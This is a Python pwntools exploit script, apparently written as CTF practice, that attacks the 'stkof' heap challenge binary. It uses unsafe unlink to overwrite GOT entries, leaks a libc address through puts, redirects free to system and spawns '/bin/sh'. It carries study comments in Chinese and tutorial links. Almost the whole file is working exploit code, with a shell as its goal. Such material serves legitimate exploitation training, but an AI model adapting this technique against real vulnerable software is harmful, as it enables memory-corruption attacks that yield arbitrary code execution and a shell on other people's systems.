# -*- coding:utf-8 -*-
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'

# r = remote('52.68.31.117', 9547)
r = process('./stkof')

libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
stkof = ELF("./stkof")

# g_view = 0x602100 #重点 point1
g_view = 0x602150
print(str(r.proc.pid))

def alloc(size):
    # r.recvuntil('Action:')
    r.sendline('1')
    r.sendline(str(size))
    r.recvuntil('OK\n')

def fill(index, data):
    r.sendline('2')
    r.sendline(str(index))
    r.sendline(str(len(data)))
    r.send(data)
    r.recvuntil('OK\n')
    

def free(index):
    r.sendline('3')
    r.sendline(str(index))
    # r.recvuntil('OK\n')

# r.recvuntil('Action: ')
r.recv(timeout=0.1)




alloc(0x80)
alloc(0x80) # 0xe064b0
alloc(0x80) # 0xe06540
alloc(0x80) 


payload = ''
payload += p64(0x0) + p64(0x81)
payload += p64(g_view-0x18) + p64(g_view-0x10)
payload += 12 *p64(0x41) 
payload += p64(0x80) + p64(0x90)

fill(2, payload)
free(3)

atoi_got = stkof.got['atoi'] #point2
puts_plt = stkof.plt['puts']
free_got = stkof.got['free']

payload = ''
payload += p64(0x0) + p64(0x0) +p64(atoi_got) + p64(free_got)

fill(2, payload)
fill(2, p64(puts_plt))
free(1) #leak
r.recvuntil('OK\n')
res = r.recv(6).ljust(8, '\x00') # 重点：怎么处理泄露，打印？ point3
print("raw: ",res)
leak_libc = u64(res)-libc.symbols['atoi']
print("leak libc: ", hex(leak_libc))
system_addr = leak_libc + libc.symbols['system']
print("leak system: ", hex(system_addr))

fill(2, p64(system_addr)) # free->system
fill(4, '/bin/sh\x00')
free(4)
# log.debug("%#x => %#x" % (1, (res or '').encode('hex')))





# *** Error in `./stkof': corrupted double-linked list: 0x0000000000e064c0 ***

print(str(r.proc.pid))

r.interactive()




# links
# https://firmianay.gitbooks.io/ctf-all-in-one/doc/3.1.6_heap_exploit_1.html#unsafe_unlink 教程
# https://github.com/shellphish/how2heap